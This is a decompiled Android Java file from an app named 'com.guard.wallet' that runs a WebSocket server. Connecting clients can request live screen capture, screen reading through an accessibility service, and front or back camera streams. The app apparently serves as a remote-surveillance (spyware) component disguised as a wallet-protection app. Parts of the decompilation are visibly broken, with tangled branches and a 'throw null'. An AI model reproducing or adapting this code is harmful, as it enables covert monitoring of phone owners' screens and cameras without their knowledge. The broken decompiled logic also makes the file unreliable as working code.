package n1;

import a1.AbstractC0026q;
import android.graphics.Bitmap;
import android.os.Build;
import android.support.v4.view.PointerIconCompat;
import android.util.Log;
import com.guard.wallet.server.C0231c;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0251g;
import e1.AbstractC0272a;
import e1.C0275d;
import e1.InterfaceC0273b;
import i1.C0345h;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.channels.ByteChannel;
import java.nio.channels.CancelledKeyException;
import java.nio.channels.ClosedByInterruptException;
import java.nio.channels.SelectableChannel;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;
import l1.InterfaceC0389b;
import com.guard.wallet.entity.BuildConfig;
import p0.C0875q;
import p000a.AbstractC0000a;
import p010m.C0397d;
import p012o.RunnableC0412a;
import p012o.c0;
import p020x.C0967a;

/* renamed from: n1.b */
/* loaded from: classes.dex */
public abstract class AbstractRunnableC0411b extends AbstractC0272a implements Runnable {

    /* renamed from: w */
    public static final int f822w = Runtime.getRuntime().availableProcessors();

    /* renamed from: i */
    public final Collection f823i;

    /* renamed from: j */
    public final InetSocketAddress f824j;

    /* renamed from: k */
    public ServerSocketChannel f825k;

    /* renamed from: l */
    public Selector f826l;

    /* renamed from: m */
    public final List f827m;

    /* renamed from: n */
    public Thread f828n;

    /* renamed from: o */
    public final AtomicBoolean f829o;

    /* renamed from: p */
    public final ArrayList f830p;

    /* renamed from: q */
    public final LinkedList f831q;

    /* renamed from: r */
    public final LinkedBlockingQueue f832r;

    /* renamed from: s */
    public int f833s;

    /* renamed from: t */
    public final AtomicInteger f834t;

    /* renamed from: u */
    public final C0875q f835u;

    /* renamed from: v */
    public final int f836v;

    public AbstractRunnableC0411b(InetSocketAddress inetSocketAddress) {
        HashSet hashSet = new HashSet();
        this.f829o = new AtomicBoolean(false);
        this.f833s = 0;
        this.f834t = new AtomicInteger(0);
        this.f835u = new C0875q(0);
        this.f836v = -1;
        int i2 = f822w;
        if (i2 < 1) {
            throw new IllegalArgumentException("address and connectionscontainer must not be null and you need at least 1 decoder");
        }
        this.f827m = Collections.emptyList();
        this.f824j = inetSocketAddress;
        this.f823i = hashSet;
        this.f454b = false;
        this.f455c = false;
        this.f831q = new LinkedList();
        this.f830p = new ArrayList(i2);
        this.f832r = new LinkedBlockingQueue();
        for (int i3 = 0; i3 < i2; i3++) {
            this.f830p.add(new C0410a(this));
        }
    }

    /* renamed from: A */
    public static void m971A(SelectionKey selectionKey, InterfaceC0273b interfaceC0273b, IOException iOException) {
        SelectableChannel channel;
        if (selectionKey != null) {
            selectionKey.cancel();
        }
        if (interfaceC0273b != null) {
            interfaceC0273b.mo751f(iOException.getMessage());
        } else {
            if (selectionKey == null || (channel = selectionKey.channel()) == null || !channel.isOpen()) {
                return;
            }
            try {
                channel.close();
            } catch (IOException unused) {
            }
            AbstractC0026q.m186s("Connection closed because of exception", iOException);
        }
    }

    /* renamed from: y */
    public static void m972y(SelectionKey selectionKey) {
        C0275d c0275d = (C0275d) selectionKey.attachment();
        try {
            if (AbstractC0026q.m173c(c0275d, c0275d.f466e) && selectionKey.isValid()) {
                selectionKey.interestOps(1);
            }
        } catch (IOException e2) {
            throw new C0345h(c0275d, e2);
        }
    }

    /* renamed from: B */
    public abstract void mo513B(InterfaceC0273b interfaceC0273b);

    /* renamed from: C */
    public abstract void mo514C(Exception exc);

    /* renamed from: D */
    public final void m973D(ByteBuffer byteBuffer) {
        LinkedBlockingQueue linkedBlockingQueue = this.f832r;
        if (linkedBlockingQueue.size() > this.f834t.intValue()) {
            return;
        }
        linkedBlockingQueue.put(byteBuffer);
    }

    /* renamed from: E */
    public final boolean m974E(InterfaceC0273b interfaceC0273b) {
        boolean z2;
        synchronized (this.f823i) {
            if (this.f823i.contains(interfaceC0273b)) {
                z2 = this.f823i.remove(interfaceC0273b);
            } else {
                Log.d("n1.b", "Removing connection which is not in the connections collection! Possible no handshake received! {}");
                z2 = false;
            }
        }
        if (this.f829o.get() && this.f823i.isEmpty()) {
            this.f828n.interrupt();
        }
        return z2;
    }

    /* renamed from: F */
    public final void m975F(String str) {
        ArrayList arrayList;
        Selector selector;
        if (this.f829o.compareAndSet(false, true)) {
            synchronized (this.f823i) {
                arrayList = new ArrayList(this.f823i);
            }
            Iterator it = arrayList.iterator();
            while (it.hasNext()) {
                ((InterfaceC0273b) it.next()).mo747b(PointerIconCompat.TYPE_CONTEXT_MENU, str);
            }
            this.f835u.getClass();
            synchronized (this) {
                if (this.f828n != null && (selector = this.f826l) != null) {
                    selector.wakeup();
                    this.f828n.join(0);
                }
            }
        }
    }

    public void finalize() {
        m976t();
        super.finalize();
    }

    @Override // e1.AbstractC0274c
    /* renamed from: h */
    public final InetSocketAddress mo753h(InterfaceC0273b interfaceC0273b) {
        return (InetSocketAddress) ((SocketChannel) ((C0275d) interfaceC0273b).f465d.channel()).socket().getRemoteSocketAddress();
    }

    @Override // e1.AbstractC0274c
    /* renamed from: i */
    public final void mo754i(InterfaceC0273b interfaceC0273b, int i2, String str, boolean z2) {
        this.f826l.wakeup();
        if (m974E(interfaceC0273b)) {
            mo513B(interfaceC0273b);
        }
    }

    @Override // e1.AbstractC0274c
    /* renamed from: j */
    public final void mo755j() {
    }

    @Override // e1.AbstractC0274c
    /* renamed from: k */
    public final void mo756k() {
    }

    @Override // e1.AbstractC0274c
    /* renamed from: l */
    public final void mo757l(InterfaceC0273b interfaceC0273b, Exception exc) {
        mo514C(exc);
    }

    @Override // e1.AbstractC0274c
    /* renamed from: m */
    public final void mo758m() {
    }

    @Override // e1.AbstractC0274c
    /* renamed from: n */
    public final void mo759n(InterfaceC0273b interfaceC0273b, String str) {
        Log.d("MyWebSocketServer", "MyWebSocketServer onMessage getHostAddress:" + interfaceC0273b.mo752g().getAddress().getHostAddress());
        Log.d("MyWebSocketServer", "MyWebSocketServer onMessage msg:" + str);
        interfaceC0273b.mo748c("OK");
    }

    /* JADX WARN: Removed duplicated region for block: B:31:0x009d  */
    /* JADX WARN: Removed duplicated region for block: B:35:0x00a6  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x00ee  */
    /* JADX WARN: Removed duplicated region for block: B:49:0x00f7  */
    /* JADX WARN: Removed duplicated region for block: B:63:0x0142  */
    /* JADX WARN: Removed duplicated region for block: B:64:0x014a  */
    /* JADX WARN: Removed duplicated region for block: B:77:0x0192  */
    /* JADX WARN: Removed duplicated region for block: B:78:0x01b0  */
    @Override // e1.AbstractC0274c
    /* renamed from: o */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void mo760o(InterfaceC0273b interfaceC0273b, InterfaceC0389b interfaceC0389b) {
        boolean z2;
        boolean z3;
        boolean z4;
        boolean z5;
        StringBuilder sb;
        boolean z6 = true;
        if (this.f829o.get()) {
            interfaceC0273b.mo750e(PointerIconCompat.TYPE_CONTEXT_MENU);
            z2 = true;
        } else {
            synchronized (this.f823i) {
                z2 = this.f823i.add(interfaceC0273b);
            }
        }
        if (z2) {
            C0231c c0231c = (C0231c) this;
            if (Objects.equals(interfaceC0273b.mo749d(), "/minicap")) {
                if (MyAccessibilityService.m554P() != null) {
                    interfaceC0273b.mo748c("welcome to minicap");
                    c0231c.f300y.offer(interfaceC0273b);
                    if (Build.VERSION.SDK_INT < 30) {
                        C0967a m1462b = C0967a.m1462b();
                        ReentrantLock reentrantLock = m1462b.f2300e;
                        if (reentrantLock.tryLock()) {
                            if (m1462b.m1464c()) {
                                Bitmap bitmap = (Bitmap) m1462b.f2302g.f2303a.get();
                                if (bitmap != null) {
                                    byte[] M0 = AbstractC0251g.M0(bitmap, 0.25f, 25);
                                    if (MyAccessibilityService.m554P() != null) {
                                        MyAccessibilityService.m554P().getClass();
                                        MyAccessibilityService.a0(M0);
                                    }
                                }
                            } else {
                                m1462b.m1466f();
                            }
                            reentrantLock.unlock();
                        }
                    } else {
                        MyAccessibilityService.m554P().f307e.m1134a();
                    }
                    z3 = true;
                    if (z3) {
                        if (Objects.equals(interfaceC0273b.mo749d(), "/readScreen")) {
                            if (MyAccessibilityService.m554P() == null) {
                                interfaceC0273b.mo747b(200, "无障碍容器异常,请稍后重试");
                            } else {
                                interfaceC0273b.mo748c("welcome to read screen");
                                c0231c.f301z.offer(interfaceC0273b);
                                c0 c0Var = MyAccessibilityService.m554P().f308f;
                                c0Var.getClass();
                                try {
                                    if (!c0Var.f855b.get()) {
                                        c0Var.f854a.submit(new RunnableC0412a(c0Var, 4));
                                    }
                                } catch (Exception e2) {
                                    AbstractC0026q.m186s("o.c0", e2);
                                }
                                z4 = true;
                                if (z4) {
                                    if (Objects.equals(interfaceC0273b.mo749d(), "/frontCameraLive")) {
                                        if (AbstractC0251g.m664k() || MyAccessibilityService.m554P() != null) {
                                            interfaceC0273b.mo748c("welcome to front camera");
                                            c0231c.f297A.offer(interfaceC0273b);
                                            if (Integer.valueOf(c0231c.f297A.size()).intValue() == 1) {
                                                C0397d m963c = C0397d.m963c();
                                                m963c.m965d(1);
                                                if (m963c.f799c == null) {
                                                    m963c.m964a(0);
                                                }
                                            }
                                            z5 = true;
                                            if (z5) {
                                                if (Objects.equals(interfaceC0273b.mo749d(), "/backCameraLive")) {
                                                    if (AbstractC0251g.m664k() || MyAccessibilityService.m554P() != null) {
                                                        interfaceC0273b.mo748c("welcome to back camera");
                                                        c0231c.f298B.offer(interfaceC0273b);
                                                        if (Integer.valueOf(c0231c.f298B.size()).intValue() == 1) {
                                                            C0397d m963c2 = C0397d.m963c();
                                                            m963c2.m965d(0);
                                                            if (m963c2.f799c == null) {
                                                                m963c2.m964a(1);
                                                            }
                                                        }
                                                        if (z6) {
                                                            interfaceC0273b.mo747b(200, "不合法的资源路径");
                                                            return;
                                                        }
                                                        sb = new StringBuilder("WebSocket onOpen back Camera getHostAddress:");
                                                    } else {
                                                        interfaceC0273b.mo747b(200, "没有访问摄像头权限,不支持相机投屏");
                                                    }
                                                }
                                                z6 = false;
                                                if (z6) {
                                                }
                                            } else {
                                                sb = new StringBuilder("WebSocket onOpen front Camera getHostAddress:");
                                            }
                                        } else {
                                            interfaceC0273b.mo747b(200, "没有访问摄像头权限,不支持相机投屏");
                                        }
                                    }
                                    z5 = false;
                                    if (z5) {
                                    }
                                } else {
                                    sb = new StringBuilder("WebSocket onOpen read model getHostAddress:");
                                }
                            }
                        }
                        z4 = false;
                        if (z4) {
                        }
                    } else {
                        sb = new StringBuilder("WebSocket onOpen minicap getHostAddress:");
                    }
                    sb.append(interfaceC0273b.mo752g().getAddress().getHostAddress());
                    Log.d("MyWebSocketServer", sb.toString());
                }
                interfaceC0273b.mo747b(200, "无障碍容器异常,请稍后重试");
            }
            z3 = false;
            if (z3) {
            }
            sb.append(interfaceC0273b.mo752g().getAddress().getHostAddress());
            Log.d("MyWebSocketServer", sb.toString());
        }
    }

    @Override // e1.AbstractC0274c
    /* renamed from: p */
    public final void mo761p(InterfaceC0273b interfaceC0273b) {
        C0275d c0275d = (C0275d) interfaceC0273b;
        try {
            c0275d.f465d.interestOps(5);
        } catch (CancelledKeyException unused) {
            c0275d.f462a.clear();
        }
        this.f826l.wakeup();
    }

    @Override // e1.AbstractC0272a
    /* renamed from: r */
    public final Collection mo744r() {
        Collection unmodifiableCollection;
        synchronized (this.f823i) {
            unmodifiableCollection = Collections.unmodifiableCollection(new ArrayList(this.f823i));
        }
        return unmodifiableCollection;
    }

    @Override // java.lang.Runnable
    public final void run() {
        boolean z2;
        int i2;
        boolean z3;
        SelectionKey selectionKey;
        SelectionKey next;
        synchronized (this) {
            if (this.f828n != null) {
                throw new IllegalStateException(getClass().getName().concat(" can only be started once."));
            }
            this.f828n = Thread.currentThread();
            z2 = true;
            i2 = 0;
            z3 = !this.f829o.get();
        }
        if (z3) {
            this.f828n.setName("WebSocketSelector-" + this.f828n.getId());
            try {
                if (this.f825k == null) {
                    this.f825k = ServerSocketChannel.open();
                }
                this.f825k.configureBlocking(false);
                ServerSocket socket = this.f825k.socket();
                socket.setReuseAddress(this.f455c);
                if (!socket.isBound()) {
                    socket.bind(this.f824j, this.f836v);
                }
                Selector open = Selector.open();
                this.f826l = open;
                ServerSocketChannel serverSocketChannel = this.f825k;
                serverSocketChannel.register(open, serverSocketChannel.validOps());
                m745s();
                Iterator it = this.f830p.iterator();
                while (it.hasNext()) {
                    ((C0410a) it.next()).start();
                }
                Log.d("MyWebSocketServer", "MyWebSocketServer 已启动");
                ((C0231c) this).f299x.set(true);
            } catch (IOException e2) {
                m981z(null, e2);
                z2 = false;
            }
            if (z2) {
                int i3 = 5;
                while (!this.f828n.isInterrupted() && i3 != 0) {
                    try {
                        try {
                            try {
                                try {
                                    if (this.f829o.get()) {
                                        i2 = 5;
                                    }
                                    if (this.f826l.select(i2) == 0 && this.f829o.get()) {
                                        i3--;
                                    }
                                    Iterator<SelectionKey> it2 = this.f826l.selectedKeys().iterator();
                                    selectionKey = null;
                                    while (it2.hasNext()) {
                                        try {
                                            next = it2.next();
                                        } catch (C0345h e3) {
                                            e = e3;
                                        } catch (IOException e4) {
                                            e = e4;
                                        }
                                        try {
                                            if (next.isValid()) {
                                                if (next.isAcceptable()) {
                                                    m977u(it2);
                                                } else if ((!next.isReadable() || m979w(next, it2)) && next.isWritable()) {
                                                    m972y(next);
                                                }
                                            }
                                            selectionKey = next;
                                        } catch (C0345h e5) {
                                            e = e5;
                                            selectionKey = next;
                                            m971A(selectionKey, e.f657a, e.f658b);
                                        } catch (IOException e6) {
                                            e = e6;
                                            selectionKey = next;
                                            m971A(selectionKey, null, e);
                                        }
                                    }
                                    m978v();
                                } catch (InterruptedException unused) {
                                    Thread.currentThread().interrupt();
                                } catch (CancelledKeyException unused2) {
                                } catch (ClosedByInterruptException unused3) {
                                    return;
                                }
                            } catch (C0345h e7) {
                                e = e7;
                                selectionKey = null;
                            } catch (IOException e8) {
                                e = e8;
                                selectionKey = null;
                            }
                        } catch (RuntimeException e9) {
                            m981z(null, e9);
                        }
                    } finally {
                        m980x();
                    }
                }
            }
        }
    }

    /* renamed from: t */
    public final void m976t() {
        try {
            m975F(BuildConfig.FLAVOR);
            Collection collection = this.f823i;
            if (collection != null && !collection.isEmpty()) {
                collection.clear();
            }
            List list = this.f827m;
            if (list != null && !list.isEmpty()) {
                list.clear();
            }
            LinkedList linkedList = this.f831q;
            if (linkedList != null && !linkedList.isEmpty()) {
                linkedList.clear();
            }
            LinkedBlockingQueue linkedBlockingQueue = this.f832r;
            if (linkedBlockingQueue == null || linkedBlockingQueue.isEmpty()) {
                return;
            }
            linkedBlockingQueue.clear();
        } catch (Exception e2) {
            AbstractC0026q.m186s("n1.b", e2);
        }
    }

    /* renamed from: u */
    public final void m977u(Iterator it) {
        SocketChannel accept = this.f825k.accept();
        if (accept == null) {
            return;
        }
        accept.configureBlocking(false);
        Socket socket = accept.socket();
        socket.setTcpNoDelay(this.f454b);
        socket.setKeepAlive(true);
        this.f835u.getClass();
        C0275d c0275d = new C0275d(this, this.f827m);
        c0275d.f465d = accept.register(this.f826l, 1, c0275d);
        try {
            c0275d.f466e = accept;
            it.remove();
            AtomicInteger atomicInteger = this.f834t;
            if (atomicInteger.get() >= (this.f830p.size() * 2) + 1) {
                return;
            }
            atomicInteger.incrementAndGet();
            this.f832r.put(ByteBuffer.allocate(65536));
        } catch (IOException e2) {
            SelectionKey selectionKey = c0275d.f465d;
            if (selectionKey != null) {
                selectionKey.cancel();
            }
            m971A(c0275d.f465d, null, e2);
        }
    }

    /* renamed from: v */
    public final void m978v() {
        LinkedList linkedList = this.f831q;
        if (linkedList.isEmpty()) {
            return;
        }
        AbstractC0000a.m28x(((C0275d) linkedList.remove(0)).f466e);
        ByteBuffer byteBuffer = (ByteBuffer) this.f832r.take();
        try {
            byteBuffer.clear();
            throw null;
        } catch (IOException e2) {
            m973D(byteBuffer);
            throw e2;
        }
    }

    /* renamed from: w */
    public final boolean m979w(SelectionKey selectionKey, Iterator it) {
        C0275d c0275d = (C0275d) selectionKey.attachment();
        ByteBuffer byteBuffer = (ByteBuffer) this.f832r.take();
        ByteChannel byteChannel = c0275d.f466e;
        boolean z2 = false;
        if (byteChannel == null) {
            selectionKey.cancel();
            m971A(selectionKey, c0275d, new IOException());
            return false;
        }
        try {
            byteBuffer.clear();
            int read = byteChannel.read(byteBuffer);
            byteBuffer.flip();
            if (read == -1) {
                c0275d.m770o();
            } else if (read != 0) {
                z2 = true;
            }
            if (z2 && byteBuffer.hasRemaining()) {
                c0275d.f463b.put(byteBuffer);
                if (c0275d.f467f == null) {
                    ArrayList arrayList = this.f830p;
                    c0275d.f467f = (C0410a) arrayList.get(this.f833s % arrayList.size());
                    this.f833s++;
                }
                c0275d.f467f.f820a.put(c0275d);
                it.remove();
            } else {
                m973D(byteBuffer);
            }
            return true;
        } catch (IOException e2) {
            m973D(byteBuffer);
            throw new C0345h(c0275d, e2);
        }
    }

    /* renamed from: x */
    public final void m980x() {
        synchronized (this.f460h) {
            if (this.f456d != null || this.f457e != null) {
                Log.d("e1.a", "Connection lost timer stopped");
                ScheduledExecutorService scheduledExecutorService = this.f456d;
                if (scheduledExecutorService != null) {
                    scheduledExecutorService.shutdownNow();
                    this.f456d = null;
                }
                ScheduledFuture scheduledFuture = this.f457e;
                if (scheduledFuture != null) {
                    scheduledFuture.cancel(false);
                    this.f457e = null;
                }
            }
        }
        ArrayList arrayList = this.f830p;
        if (arrayList != null) {
            Iterator it = arrayList.iterator();
            while (it.hasNext()) {
                ((C0410a) it.next()).interrupt();
            }
        }
        Selector selector = this.f826l;
        if (selector != null) {
            try {
                selector.close();
            } catch (IOException e2) {
                AbstractC0026q.m186s("IOException during selector.close", e2);
                mo514C(e2);
            }
        }
        ServerSocketChannel serverSocketChannel = this.f825k;
        if (serverSocketChannel != null) {
            try {
                serverSocketChannel.close();
            } catch (IOException e3) {
                AbstractC0026q.m186s("IOException during server.close", e3);
                mo514C(e3);
            }
        }
    }

    /* renamed from: z */
    public final void m981z(C0275d c0275d, Exception exc) {
        AbstractC0026q.m186s("Shutdown due to fatal error", exc);
        mo514C(exc);
        try {
            m975F("Got error on server side: " + exc.getClass().getName() + (exc.getCause() != null ? " caused by ".concat(exc.getCause().getClass().getName()) : BuildConfig.FLAVOR));
        } catch (InterruptedException e2) {
            Thread.currentThread().interrupt();
            AbstractC0026q.m186s("Interrupt during stop", exc);
            mo514C(e2);
        }
        ArrayList arrayList = this.f830p;
        if (arrayList != null) {
            Iterator it = arrayList.iterator();
            while (it.hasNext()) {
                ((C0410a) it.next()).interrupt();
            }
        }
        Thread thread = this.f828n;
        if (thread != null) {
            thread.interrupt();
        }
    }
}
